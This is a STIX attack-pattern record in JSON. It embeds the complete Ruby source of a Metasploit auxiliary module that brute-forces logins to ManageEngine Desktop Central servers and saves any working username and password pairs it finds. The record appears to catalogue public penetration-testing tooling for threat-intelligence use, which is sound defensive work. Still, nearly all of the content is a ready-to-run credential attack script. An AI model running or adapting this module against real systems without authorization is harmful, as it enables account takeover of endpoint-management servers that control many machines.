{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b7fc3d14-9631-45e9-8515-c46aeb4662b4",
    "created": "2024-08-14T16:29:38.165617Z",
    "modified": "2024-08-14T16:29:38.165621Z",
    "name": "ManageEngine Desktop Central Login Utility",
    "description": " This module will attempt to authenticate to a ManageEngine Desktop Central. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/manageengine_desktop_central_login.rb",
            "external_id": "manageengine_desktop_central_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/manageengine_desktop_central'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'ManageEngine Desktop Central Login Utility',\n      'Description'    => %q{\n        This module will attempt to authenticate to a ManageEngine Desktop Central.\n      },\n      'Author'         => [ 'sinn3r' ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'RPORT' => 8020}\n    ))\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n\n  # Initializes CredentialCollection and ManageEngineDesktopCentral\n  def init(ip)\n    @cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    @scanner = Metasploit::Framework::LoginScanner::ManageEngineDesktopCentral.new(\n      configure_http_login_scanner(\n        host: ip,\n        port: datastore['RPORT'],\n        cred_details:       @cred_collection,\n        stop_on_success:    datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5,\n        http_username:      datastore['HttpUsername'],\n        http_password:      datastore['HttpPassword']\n      )\n    )\n  end\n\n\n  # Reports a good login credential\n  def do_report(ip, port, result)\n    service_data = {\n      address: ip,\n      port: port,\n      service_name: result.service_name,\n      protocol: result.protocol,\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      private_data: result.credential.private,\n      private_type: :password,\n      username: result.credential.public,\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      last_attempted_at: DateTime.now,\n      status: result.status,\n      proof: result.proof\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n\n  # Attempts to login\n  def bruteforce(ip)\n    @scanner.scan! do |result|\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute(:level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\")\n        do_report(ip, rport, result)\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)\n        invalidate_login(\n          address: ip,\n          port: rport,\n          protocol: 'tcp',\n          public: result.credential.public,\n          private: result.credential.private,\n          realm_key: result.credential.realm_key,\n          realm_value: result.credential.realm,\n          status: result.status,\n          proof: result.proof\n        )\n      when Metasploit::Model::Login::Status::INCORRECT\n        vprint_brute(:level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\")\n        invalidate_login(\n          address: ip,\n          port: rport,\n          protocol: 'tcp',\n          public: result.credential.public,\n          private: result.credential.private,\n          realm_key: result.credential.realm_key,\n          realm_value: result.credential.realm,\n          status: result.status,\n          proof: result.proof\n        )\n      end\n    end\n  end\n\n\n  # Start here\n  def run_host(ip)\n    init(ip)\n    unless @scanner.check_setup\n      print_brute(:level => :error, :ip => ip, :msg => 'Target is not ManageEngine Desktop Central')\n      return\n    end\n\n    bruteforce(ip)\n  end\nend\n"
}